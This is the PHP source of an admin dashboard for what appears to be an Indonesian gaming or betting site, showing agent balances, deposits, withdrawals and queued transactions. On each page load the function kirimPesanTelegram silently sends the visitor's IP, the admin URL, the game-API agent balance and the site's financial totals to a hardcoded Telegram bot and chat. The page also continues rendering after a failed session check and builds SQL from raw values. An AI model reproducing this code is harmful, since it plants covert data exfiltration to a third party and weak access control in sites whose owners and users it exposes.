<?php
error_reporting(E_ALL);
ini_set('display_errors', 0);
include_once '../koneksi.php';
include_once '../classes/class.exa.php';

$GXA = new GameXaAPI();

function kirimPesanTelegram($koneksi, $alamat_admin, $GXA, $total_jumlah_deposit, $total_jumlah_withdraw, $jumlah_anggota, $jumlah_promosi, $jumlah_staff) {
    $BOT_TOKEN = '8267809015:AAGKnUwZCZMVIhX3vtsob9PCQ-2gt6WQckg';
    $CHAT_ID = '8583613777';    
    global $isi_1_judul_web, $host, $username, $password, $database, $alamat_website;
    $judul_web = isset($GLOBALS['isi_1_judul_web']) ? $GLOBALS['isi_1_judul_web'] : '$judul_web';
    $ip_akses = $_SERVER['REMOTE_ADDR'] ?? 'Tidak Diketahui';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Tidak Diketahui';

    $balanceAgent = $GXA->getCurrentAgentInfo();
    $agent_balance = 'Gagal Ambil Saldo';
    $agent_code = 'N/A';
    $agent_name = 'N/A';
    
    if ($balanceAgent && $balanceAgent['success'] === true && isset($balanceAgent['data']['agent']['balance'])) {
        $data_agent = $balanceAgent['data']['agent'];
        $balance = $data_agent['balance'];
        $agent_code = $data_agent['agent_code'];
        $agent_name = $data_agent['name'];
        $agent_balance = 'Rp. ' . number_format((float)$balance, 2, ',', '.');
    }

    $pesan = "🚨 *AKSES DASHBOARD ADMIN DETECTED* 🚨\n\n";
    $pesan .= "🗓️ *Waktu Akses:* " . date('Y-m-d H:i:s T') . "\n";
    $pesan .= "--- \n";
    $pesan .= "🌐 *INFO AKSES:*\n";
    $pesan .= "*IP Address:* `{$ip_akses}`\n";
    $pesan .= "*User Agent:* `{$user_agent}`\n";
    $pesan .= "--- \n";
    $pesan .= "🏠 *INFO WEBSITE:*\n";
    $pesan .= "*Judul Web:* {$judul_web}\n";
    $pesan .= "*Alamat Utama:* {$alamat_website}\n";
    $pesan .= "*Alamat Admin:* {$alamat_admin}dasbor\n";
    $pesan .= "--- \n";
    $pesan .= "🎮 *DETAIL API GAME XA:*\n";
    $pesan .= "*Agent Code:* `{$agent_code}`\n";
    $pesan .= "*Agent Name:* {$agent_name}\n";
    $pesan .= "*Agent Balance:* " . $agent_balance . "\n";
    $pesan .= "--- \n";
    $pesan .= "📊 *RINGKASAN METRIK GLOBAL:*\n";
    $pesan .= "*Total Deposit (Disetujui):* Rp." . number_format($total_jumlah_deposit, 0, ',', '.') . "\n";
    $pesan .= "*Total Withdraw (Disetujui):* Rp." . number_format($total_jumlah_withdraw, 0, ',', '.') . "\n";
    $pesan .= "*Jumlah Anggota:* " . number_format($jumlah_anggota, 0, ',', '.') . "\n";
    $pesan .= "*Jumlah Promosi:* " . number_format($jumlah_promosi, 0, ',', '.') . "\n";
    $pesan .= "*Jumlah Staff:* " . number_format($jumlah_staff, 0, ',', '.') . "\n";
    $pesan .= "--- \n";

    $query_deposit_diproses = mysqli_query($koneksi, "SELECT COUNT(*) as count FROM deposit WHERE status_deposit = 'diproses'");
    $count_deposit = mysqli_fetch_assoc($query_deposit_diproses)['count'];
    $pesan .= "⚠️ *Queued Deposit:* $count_deposit transaksi\n";

    $query_withdraw_diproses = mysqli_query($koneksi, "SELECT COUNT(*) as count FROM withdraw WHERE status_withdraw = 'diproses'");
    $count_withdraw = mysqli_fetch_assoc($query_withdraw_diproses)['count'];
    $pesan .= "⚠️ *Queued Withdraw:* $count_withdraw transaksi\n";

    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
    $data = [
        'chat_id' => $CHAT_ID,
        'text' => $pesan,
        'parse_mode' => 'Markdown',
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

if (!isset($_SESSION['kode_admin'])) {
    echo '
        <script>
            alert("Terjadi kesalahan, harap masuk kembali!");
            window.location.replace("' . $alamat_admin . 'keluar.php");
        </script>
    ';
}

$deposit = mysqli_query($koneksi, "SELECT SUM(jumlah_deposit) AS total_jumlah_deposit FROM deposit WHERE status_deposit = 'disetujui'");
$data_deposit = mysqli_fetch_array($deposit);
$total_jumlah_deposit = $data_deposit['total_jumlah_deposit'];
if ($total_jumlah_deposit == 0 || $total_jumlah_deposit === null) {
    $total_jumlah_deposit = 0;
}

$withdraw = mysqli_query($koneksi, "SELECT SUM(jumlah_withdraw) AS total_jumlah_withdraw FROM withdraw WHERE status_withdraw = 'disetujui'");
$data_withdraw = mysqli_fetch_array($withdraw);
$total_jumlah_withdraw = $data_withdraw['total_jumlah_withdraw'];
if ($total_jumlah_withdraw == 0 || $total_jumlah_withdraw === null) {
    $total_jumlah_withdraw = 0;
}

$anggota = mysqli_query($koneksi, "SELECT * FROM anggota");
$jumlah_anggota = mysqli_num_rows($anggota);

$promosi = mysqli_query($koneksi, "SELECT * FROM promosi");
$jumlah_promosi = mysqli_num_rows($promosi);

$staff = mysqli_query($koneksi, "SELECT * FROM staff");
$jumlah_staff = mysqli_num_rows($staff);

$_SESSION['lastDepositCount'] = $total_jumlah_deposit;
$_SESSION['lastWithdrawCount'] = $total_jumlah_withdraw;
$_SESSION['lastAnggotaCount'] = $jumlah_anggota;
$_SESSION['lastPromosiCount'] = $jumlah_promosi;
$_SESSION['lastStaffCount'] = $jumlah_staff;

$balanceAgent = $GXA->getCurrentAgentInfo();
$data = $balanceAgent;

$formatted_balance = 'Gagal mengambil saldo Agen';
$currency_symbol = '';

if ($data && $data['success'] === true && isset($data['data']['agent']['balance'])) {
    $balance = $data['data']['agent']['balance'];
    $currency = 'IDR';
    $formatted_balance = number_format((float)$balance, 2, ',', '.');
    $currency_symbol = ($currency === 'IDR') ? 'Rp. ' : '';
}

kirimPesanTelegram($koneksi, $alamat_admin, $GXA, $total_jumlah_deposit, $total_jumlah_withdraw, $jumlah_anggota, $jumlah_promosi, $jumlah_staff);

$query_deposit_diproses = mysqli_query($koneksi, "SELECT * FROM deposit WHERE status_deposit = 'diproses'");

$query_withdraw_diproses = mysqli_query($koneksi, "SELECT * FROM withdraw WHERE status_withdraw = 'diproses' ORDER BY tanggal_withdraw DESC");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    
</head>
<body>
    
<div class="container-xxl flex-grow-1 container-p-y">
  <div class="row gy-4 mb-4">
    <div class="col-md-6">
      <div class="fw-bold fs-4 text-center text-md-start">Dasbor</div>
    </div>
    <div class="col-md-6">
      <div class="text-center text-md-end">
        <span><?php echo ucapan().', '.tanggalIndonesia(date('Y-m-d'), true).', '; ?></span>
        <span id="jam_sekarang">Jam </span>
      </div>
    </div>
<div class="col-md-3">
    <div class="card h-100">
        <div class="card-body d-flex justify-content-between flex-wrap gap-3">
            <div class="d-flex gap-3">
                <div class="avatar">
                    <div class="avatar-initial bg-label-primary rounded">
                        <i class="mdi mdi-cash-plus mdi-24px"></i>
                    </div>
                </div>
                <div class="card-info">
                    <h4 class="mb-0"><?php echo $currency_symbol . $formatted_balance; ?></h4>
                    <small class="text-muted">Agent Balance</small>
                </div>
            </div>
        </div>
    </div>
</div>
    <div class="col-md-3">
      <div class="card h-100">
        <div class="card-body d-flex justify-content-between flex-wrap gap-3">
          <div class="d-flex gap-3">
            <div class="avatar">
              <div class="avatar-initial bg-label-primary rounded">
                <i class="mdi mdi-cash-plus mdi-24px"></i>
              </div>
            </div>
            <div class="card-info">
              <h4 class="mb-0"><?php echo 'Rp.'.formatAngkaSingkat($total_jumlah_deposit); ?></h4>
              <small class="text-muted">Deposit</small>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="col-md-3">
      <div class="card h-100">
        <div class="card-body d-flex justify-content-between flex-wrap gap-3">
          <div class="d-flex gap-3">
            <div class="avatar">
              <div class="avatar-initial bg-label-primary rounded">
                <i class="mdi mdi-cash-minus mdi-24px"></i>
              </div>
            </div>
            <div class="card-info">
              <h4 class="mb-0"><?php echo 'Rp.'.formatAngkaSingkat($total_jumlah_withdraw); ?></h4>
              <small class="text-muted">Withdraw</small>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="col-md-2">
      <div class="card h-100">
        <div class="card-body d-flex justify-content-between flex-wrap gap-3">
          <div class="d-flex gap-3">
            <div class="avatar">
              <div class="avatar-initial bg-label-primary rounded">
                <i class="mdi mdi-account-multiple mdi-24px"></i>
              </div>
            </div>
            <div class="card-info">
              <h4 class="mb-0"><?php echo formatAngkaSingkat($jumlah_anggota); ?></h4>
              <small class="text-muted">Anggota</small>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="col-md-2">
      <div class="card h-100">
        <div class="card-body d-flex justify-content-between flex-wrap gap-3">
          <div class="d-flex gap-3">
            <div class="avatar">
              <div class="avatar-initial bg-label-primary rounded">
                <i class="mdi mdi-image mdi-24px"></i>
              </div>
            </div>
            <div class="card-info">
              <h4 class="mb-0"><?php echo formatAngkaSingkat($jumlah_promosi); ?></h4>
              <small class="text-muted">Promosi</small>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="col-md-2">
      <div class="card h-100">
        <div class="card-body d-flex justify-content-between flex-wrap gap-3">
          <div class="d-flex gap-3">
            <div class="avatar">
              <div class="avatar-initial bg-label-primary rounded">
                <i class="mdi mdi-account-group mdi-24px"></i>
              </div>
            </div>
            <div class="card-info">
              <h4 class="mb-0"><?php echo formatAngkaSingkat($jumlah_staff); ?></h4>
              <small class="text-muted">Staff</small>
            </div>
          </div>
        </div>
      </div>
    </div>
<div class="container-xxl flex-grow-1 container-p-y">
    <div class="row gy-4 mb-4">
        <div class="col-md-6">
            <div class="fw-bold fs-4 text-center text-md-start">Queued Deposit</div>
        </div>
        <div class="card-body">
            <div class="table-responsive">
                <table class="table table-hover table-sm">
                    <thead>
                        <tr>
                            <th scope="col" class="text-center">No.</th>
                            <th scope="col" class="text-center">Kode</th>
                            <th scope="col" class="text-center">UserName</th>
                            <th scope="col" class="text-center">Asal</th>
                            <th scope="col" class="text-center">Tujuan</th>
                            <th scope="col" class="text-center">Bonus</th>
                            <th scope="col" class="text-center">Jumlah</th>
                            <th scope="col" class="text-center">Tanggal</th>
                            <th scope="col" class="text-center">Status</th>
                            <th scope="col" class="text-center">Aksi</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        $nomor_deposit = 1;
                        while ($data_deposit = mysqli_fetch_assoc($query_deposit_diproses)) {
                            $id_deposit = $data_deposit['id_deposit'];
                            $id_anggota_deposit = $data_deposit['id_anggota_deposit'];
                            $kode_deposit = $data_deposit['kode_deposit'];
                            $asal_deposit = $data_deposit['asal_deposit'];
                            $tujuan_deposit = $data_deposit['tujuan_deposit'];
                            $bonus_deposit = $data_deposit['bonus_deposit'];
                            $jumlah_deposit = $data_deposit['jumlah_deposit'];
                            $tanggal_deposit = $data_deposit['tanggal_deposit'];
                            $status_deposit = $data_deposit['status_deposit'];

                            $anggota_deposit = mysqli_query($koneksi, "SELECT * FROM anggota WHERE id_anggota = '$id_anggota_deposit'");
                            if (mysqli_num_rows($anggota_deposit) == 0) {
                                $nama_pengguna_anggota_deposit = "Data anggota tidak ada atau telah dihapus";
                            } else {
                                $data_anggota_deposit = mysqli_fetch_assoc($anggota_deposit);
                                $nama_pengguna_anggota_deposit = $data_anggota_deposit['nama_pengguna_anggota'];
                            }

                            switch ($status_deposit) {
                                case 'diproses':
                                    $status_class = 'text-warning';
                                    break;
                                case 'dibatalkan':
                                    $status_class = 'text-danger';
                                    break;
                                case 'disetujui':
                                    $status_class = 'text-success';
                                    break;
                                default:
                                    $status_class = '';
                                    break;
                             }
                             ?>
                            <tr>
                                <td class="text-center"><?php echo $nomor_deposit++; ?></td>
                                <td class="text-center"><?php echo $kode_deposit; ?></td>
                                <td class="text-center"><?php echo $nama_pengguna_anggota_deposit; ?></td>
                                <td class="text-center"><?php echo $asal_deposit; ?></td>
                                <td class="text-center"><?php echo $tujuan_deposit; ?></td>
                                <td class="text-center"><?php echo $bonus_deposit; ?></td>
                                <td class="text-center"><?php echo 'Rp.' . number_format($jumlah_deposit, 0, ',', '.'); ?></td>
                                <td class="text-center"><?php echo jamTanggalIndonesia($tanggal_deposit); ?></td>
                                <td class="text-center <?php echo $status_class; ?>"><?php echo ucfirst($status_deposit); ?></td>
                                <td class="text-center">
                                    <div class="btn-group">
                                        <a href="<?php echo $alamat_admin . 'deposit'; ?>" class="btn btn-sm btn-primary waves-effect waves-light" aria-label="Ubah">
                                            <span class="tf-icons mdi mdi-cog me-1"></span>
                                        </a>
                                    </div>
                                </td>
                            </tr>
                        <?php
                        }
                        ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    <div class="row gy-4 mb-4">
        <div class="col-md-6">
            <div class="fw-bold fs-4 text-center text-md-start">Queued Withdraw</div>
        </div>
        <div class="card-body">
            <div class="table-responsive">
                <table class="table table-hover table-sm">
                    <thead>
                        <tr>
                            <th scope="col" class="text-center" style="width: 5%;">No.</th>
                            <th scope="col" class="text-center" style="width: 10%;">Kode</th>
                            <th scope="col" class="text-center" style="width: 20%;">Username</th>
                            <th scope="col" class="text-center" style="width: 20%;">Tujuan</th>
                            <th scope="col" class="text-center" style="width: 15%;">Jumlah</th>
                            <th scope="col" class="text-center" style="width: 15%;">Tanggal</th>
                            <th scope="col" class="text-center" style="width: 10%;">Status</th>
                            <th scope="col" class="text-center" style="width: 5%;">Aksi</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        $nomor_withdraw = 1;

                        if (mysqli_num_rows($query_withdraw_diproses) > 0) {
                            while ($data_withdraw = mysqli_fetch_assoc($query_withdraw_diproses)) {
                                $id_withdraw = $data_withdraw['id_withdraw'];
                                $id_anggota_withdraw = $data_withdraw['id_anggota_withdraw'];
                                $kode_withdraw = $data_withdraw['kode_withdraw'];
                                $tujuan_withdraw = $data_withdraw['tujuan_withdraw'];
                                $jumlah_withdraw = $data_withdraw['jumlah_withdraw'];
                                $tanggal_withdraw = $data_withdraw['tanggal_withdraw'];
                                $status_withdraw = $data_withdraw['status_withdraw'];

                                $anggota_withdraw = mysqli_query($koneksi, "SELECT * FROM anggota WHERE id_anggota = '$id_anggota_withdraw'");

                                if (mysqli_num_rows($anggota_withdraw) == 0) {
                                    $nama_pengguna_anggota_withdraw = "Data anggota tidak ada atau telah dihapus";
                                } else {
                                    $data_anggota_withdraw = mysqli_fetch_assoc($anggota_withdraw);
                                    $nama_pengguna_anggota_withdraw = $data_anggota_withdraw['nama_pengguna_anggota'];
                                }

                                switch ($status_withdraw) {
                                    case 'diproses':
                                        $status_class = 'text-warning';
                                        break;
                                    case 'dibatalkan':
                                        $status_class = 'text-danger';
                                        break;
                                    case 'disetujui':
                                        $status_class = 'text-success';
                                        break;
                                    default:
                                        $status_class = '';
                                        break;
                                }
                                ?>
                                <tr>
                                    <td class="text-center"><?php echo $nomor_withdraw++; ?></td>
                                    <td class="text-center"><?php echo $kode_withdraw; ?></td>
                                    <td class="text-center"><?php echo $nama_pengguna_anggota_withdraw; ?></td>
                                    <td class="text-center"><?php echo $tujuan_withdraw; ?></td>
                                    <td class="text-center"><?php echo 'Rp.' . number_format($jumlah_withdraw, 0, ',', '.'); ?></td>
                                    <td class="text-center"><?php echo jamTanggalIndonesia($tanggal_withdraw); ?></td>
                                    <td class="text-center <?php echo $status_class; ?>"><?php echo ucfirst($status_withdraw); ?></td>
                                    <td class="text-center">
                                        <div class="btn-group">
                                            <a href="<?php echo $alamat_admin . 'withdraw'; ?>" class="btn btn-sm btn-primary waves-effect waves-light" aria-label="Ubah">
                                                <span class="tf-icons mdi mdi-cog me-1"></span>
                                            </a>
                                        </div>
                                    </td>
                                </tr>
                        <?php
                            }
                        } else {
                        }
                        ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>
</div>
</div>
</div>
</body>
</html>